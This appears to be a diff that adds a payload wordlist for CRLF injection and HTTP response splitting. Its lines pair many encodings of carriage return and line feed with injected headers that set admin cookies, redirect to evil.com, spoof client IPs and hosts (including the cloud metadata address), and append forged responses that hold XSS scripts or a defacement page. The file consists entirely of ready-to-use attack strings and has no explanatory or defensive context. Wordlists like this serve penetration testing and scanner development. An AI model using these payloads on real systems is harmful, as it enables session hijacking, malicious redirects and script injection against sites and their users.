@@ -1,0 +1,253 @@
+%0d%0a
+%0d
+%0a
+%0D%0A
+%0D
+%0A
+\r\n
+\r
+\n
+\r\n\r\n
+%0d%0a%0d%0a
+%0D%0A%0D%0A
+\r\n\r\n
+%0d%0aContent-Length:0%0d%0a%0d%0a
+%0d%0aHTTP/1.1 200 OK%0d%0a
+%0d%0aSet-Cookie:session=admin
+%0d%0aLocation:http://evil.com
+%0d%0aContent-Type:text/html
+%0d%0aX-Forwarded-For:127.0.0.1
+%0d%0aX-Custom-Header:injected
+%0aSet-Cookie:admin=true
+%0aLocation:javascript:alert(1)
+%0d%0a%20Set-Cookie:admin=true
+%0d%0a%09Set-Cookie:admin=true
+%0d%0aSet-Cookie:sessionid=malicious%0d%0a
+%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><body><h1>Defaced</h1></body></html>
+%E5%98%8A%E5%98%8D
+%E5%98%8D
+%E5%98%8A
+%E5%98%8D%E5%98%8A
+%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D
+%C4%8D%C4%8A
+%C4%8A
+%C4%8D
+%E2%80%A8
+%E2%80%A9
+%E2%80%A8%E2%80%A9
+%u000d%u000a
+%u000a
+%u000d
+\u000d\u000a
+\u000a
+\u000d
+%250d%250a
+%250a
+%250d
+%250d%250a%250d%250a
+%%0d0d%%0a0a
+%25250d%25250a
+%25%30%64%25%30%61
+%c0%8d%c0%8a
+%e0%80%8d%e0%80%8a
+%c0%ae
+%u0000%0d%0a
+%00%0d%0a
+%0d%0a%00
+%ef%bb%bf%0d%0a
+%uff00%0d%0a
+%E5%98%8A%E5%98%8DSet-Cookie:admin=true
+%E5%98%8DSet-Cookie:admin=true
+%E5%98%8A%E5%98%8DLocation:http://evil.com
+crlf%0d%0aSet-Cookie:admin=true
+%0d%0a%20%20Set-Cookie:admin=true
+%0d%0a\tSet-Cookie:admin=true
+%0d%0a%20X-Custom:injected
+%0d%0a%00Set-Cookie:admin=true
+%0d%0a%0aSet-Cookie:admin=true
+%0d%0a%0d%0aSet-Cookie:admin=true
+%0d%0a%0d%0a%0d%0aSet-Cookie:admin=true
+/%0d%0a
+./%0d%0a
+../%0d%0a
+/%0d%0aSet-Cookie:admin=true
+%2f%0d%0aSet-Cookie:admin=true
+%2e%2f%0d%0aSet-Cookie:admin=true
+%2e%2e%2f%0d%0aSet-Cookie:admin=true
+%0d%0a%20HTTP/1.1%20200%20OK
+%0d%0a%09HTTP/1.1%20200%20OK
+%0d%0aHTTP/1.1%20301%20Moved%20Permanently%0d%0aLocation:http://evil.com
+%0d%0aHTTP/1.1%20302%20Found%0d%0aLocation:http://evil.com
+%0d%0aHTTP/1.1%20303%20See%20Other%0d%0aLocation:http://evil.com
+%0d%0aHTTP/1.1%20307%20Temporary%20Redirect%0d%0aLocation:http://evil.com
+%0d%0aHTTP/1.1%20308%20Permanent%20Redirect%0d%0aLocation:http://evil.com
+%0d%0aContent-Type:text/html;charset=utf-7
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aContent-Length:35%0d%0a%0d%0a<script>alert(document.cookie)</script>
+%0d%0aX-XSS-Protection:0
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:text/html
+%0d%0aContent-Security-Policy:default-src%20*
+%0d%0aAccess-Control-Allow-Origin:*
+%0d%0aAccess-Control-Allow-Credentials:true
+%0d%0aRefresh:0;url=http://evil.com
+%0d%0aRefresh:0;url=javascript:alert(1)
+%0d%0aLink:<http://evil.com>
+%0d%0aX-Frame-Options:ALLOW
+\r\nSet-Cookie:admin=true
+\rSet-Cookie:admin=true
+\nSet-Cookie:admin=true
+\r\n\r\nSet-Cookie:admin=true
+\r\nHTTP/1.1 200 OK\r\n
+\r\nLocation:http://evil.com
+\r\nContent-Type:text/html
+\r\n Set-Cookie:admin=true
+\r\n\tSet-Cookie:admin=true
+\r\nX-Powered-By:Injected
+\r\nServer:Hacked
+\r\nVia:injected
+\r\nCache-Control:no-cache
+\r\nPragma:no-cache
+\r\nExpires:0
+\r\nLast-Modified:injected
+\r\nETag:injected
+\r\nAge:0
+\r\nWarning:injected
+\r\nAccept-Ranges:bytes
+\r\nContent-Encoding:gzip
+\r\nContent-Language:en
+\r\nContent-Location:http://evil.com
+\r\nContent-MD5:injected
+\r\nContent-Range:bytes
+\r\nTransfer-Encoding:chunked
+\r\nUpgrade:websocket
+\r\nConnection:close
+\r\nProxy-Authenticate:Basic
+\r\nWWW-Authenticate:Basic
+\r\nAuthorization:Bearer injected
+\r\nProxy-Authorization:Basic injected
+%0dSet-Cookie:admin=true
+%0aSet-Cookie:admin=true
+%0d%0aSet-Cookie:sessionid=abc123;HttpOnly
+%0d%0aSet-Cookie:sessionid=abc123;Secure
+%0d%0aSet-Cookie:sessionid=abc123;SameSite=None
+%0d%0aSet-Cookie:token=malicious;Domain=.evil.com
+%0d%0aSet-Cookie:auth=true;Path=/admin
+%0d%0aSet-Cookie:admin=true;Expires=Wed,%2030%20Dec%202099%2023:59:59%20GMT
+%0d%0aStatus:200 OK
+%0d%0aStatus:301 Moved Permanently
+%0d%0aStatus:302 Found
+%0d%0aStatus:500 Internal Server Error
+%0d%0aHTTP/1.0 200 OK%0d%0a
+%0d%0aHTTP/2 200 OK%0d%0a
+%0d%0aHTTP/1.1 200%0d%0a
+%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Injected</h1>
+%0d%0a%0d%0a<script>alert(String.fromCharCode(88,83,83))</script>
+%0d%0a%0d%0a<img src=x onerror=alert(1)>
+%0d%0a%0d%0a<svg onload=alert(1)>
+%0d%0a%0d%0a<body onload=alert(1)>
+%0d%0a%0d%0a<iframe src=javascript:alert(1)>
+%0d%0a%0d%0a<object data=javascript:alert(1)>
+%0d%0a%0d%0a<embed src=javascript:alert(1)>
+%0d%0a%0d%0a<form action=javascript:alert(1)><button>Click</button></form>
+%0d%0a%0d%0a<input onfocus=alert(1) autofocus>
+%0d%0a%0d%0a<select onfocus=alert(1) autofocus>
+%0d%0a%0d%0a<textarea onfocus=alert(1) autofocus>
+%0d%0a%0d%0a<marquee onstart=alert(1)>
+%0d%0a%0d%0a<details open ontoggle=alert(1)>
+%0d%0a%0d%0a<video src=x onerror=alert(1)>
+%0d%0a%0d%0a<audio src=x onerror=alert(1)>
+%0d%0aX-Forwarded-Host:evil.com
+%0d%0aX-Forwarded-Proto:https
+%0d%0aX-Original-URL:/admin
+%0d%0aX-Rewrite-URL:/admin
+%0d%0aBase-URL:http://evil.com
+%0d%0aClient-IP:127.0.0.1
+%0d%0aCluster-Client-IP:127.0.0.1
+%0d%0aForwarded:for=127.0.0.1
+%0d%0aTrue-Client-IP:127.0.0.1
+%0d%0aX-Client-IP:127.0.0.1
+%0d%0aX-Host:evil.com
+%0d%0aX-Originating-IP:127.0.0.1
+%0d%0aX-Real-IP:127.0.0.1
+%0d%0aX-Remote-Addr:127.0.0.1
+%0d%0aX-Remote-IP:127.0.0.1
+%0d%0aHost:evil.com
+%0d%0aHost:localhost
+%0d%0aHost:127.0.0.1
+%0d%0aHost:0.0.0.0
+%0d%0aHost:[::1]
+%0d%0aHost:10.0.0.1
+%0d%0aHost:192.168.1.1
+%0d%0aHost:169.254.169.254
+%0d%0aOrigin:http://evil.com
+%0d%0aReferer:http://evil.com
+%0d%0aFrom:attacker@evil.com
+%23%0d%0aSet-Cookie:admin=true
+%3f%0d%0aSet-Cookie:admin=true
+%26%0d%0aSet-Cookie:admin=true
+%3d%0d%0aSet-Cookie:admin=true
+%3b%0d%0aSet-Cookie:admin=true
+%20%0d%0aSet-Cookie:admin=true
+%09%0d%0aSet-Cookie:admin=true
+%00%0d%0aSet-Cookie:admin=true
+%0b%0d%0aSet-Cookie:admin=true
+%0c%0d%0aSet-Cookie:admin=true
+%0d%0aSet-Cookie:admin=true%23
+%0d%0aSet-Cookie:admin=true%3f
+%0d%0aSet-Cookie:admin=true%26
+%0d%0aSet-Cookie:admin=true%3b
+%0d%0aSet-Cookie:admin=true%20
+%0d%0aSet-Cookie:admin=true%00
+%0d%0a%20%20%20Set-Cookie:admin=true
+%0d%0a%09%09Set-Cookie:admin=true
+%0d%0a%0b%0bSet-Cookie:admin=true
+%0d%0a%0c%0cSet-Cookie:admin=true
+test%0d%0aSet-Cookie:admin=true
+test%0aSet-Cookie:admin=true
+test%0dSet-Cookie:admin=true
+value%0d%0aSet-Cookie:admin=true
+param=value%0d%0aSet-Cookie:admin=true
+/%0d%0aLocation:http://evil.com
+/%0aLocation:http://evil.com
+/%0dLocation:http://evil.com
+/%250d%250aLocation:http://evil.com
+/%25%30%64%25%30%61Location:http://evil.com
+/%E5%98%8A%E5%98%8DLocation:http://evil.com
+%0d%0aSet-Cookie:admin=true;%20
+%0d%0aSet-Cookie:admin=true;%0d%0a
+%0d%0aSet-Cookie:admin=true%0d%0aSet-Cookie:user=attacker
+%0d%0aSet-Cookie:admin=true%0d%0aLocation:http://evil.com
+%0d%0aLocation:http://evil.com%0d%0aSet-Cookie:admin=true
+%0d%0aHTTP/1.1%20200%20OK%0d%0aSet-Cookie:admin=true
+%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:0%0d%0a%0d%0a
+%0d%0aContent-Length:%200%0d%0a%0d%0a
+%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0a
+%0d%0aConnection:%20close%0d%0a%0d%0a
+%0d%0aConnection:%20keep-alive%0d%0a
+%0d%0a%0d%0a0%0d%0a%0d%0a
+%0d%0a0%0d%0a%0d%0a
+%0d%0a1%0d%0aA%0d%0a0%0d%0a%0d%0a
+%0d%0aContent-Type:multipart/form-data
+%0d%0aContent-Type:application/x-www-form-urlencoded
+%0d%0aContent-Type:application/json
+%0d%0aContent-Type:application/xml
+%0d%0aContent-Type:text/xml
+%0d%0aContent-Type:text/plain
+%0d%0aContent-Type:image/svg+xml
+%E5%98%8ASet-Cookie:admin=true
+%E5%98%8DSet-Cookie:admin=true
+%E5%98%8A%E5%98%8D%E5%98%8ASet-Cookie:admin=true
+%C4%8ASet-Cookie:admin=true
+%C4%8DSet-Cookie:admin=true
+%C4%8D%C4%8ASet-Cookie:admin=true
+%u000aSet-Cookie:admin=true
+%u000dSet-Cookie:admin=true
+%u000d%u000aSet-Cookie:admin=true
+\u000aSet-Cookie:admin=true
+\u000dSet-Cookie:admin=true
+\u000d\u000aSet-Cookie:admin=true
+%c0%aaSet-Cookie:admin=true
+%e0%80%aaSet-Cookie:admin=true
+%c0%8aSet-Cookie:admin=true
+%e0%80%8aSet-Cookie:admin=true
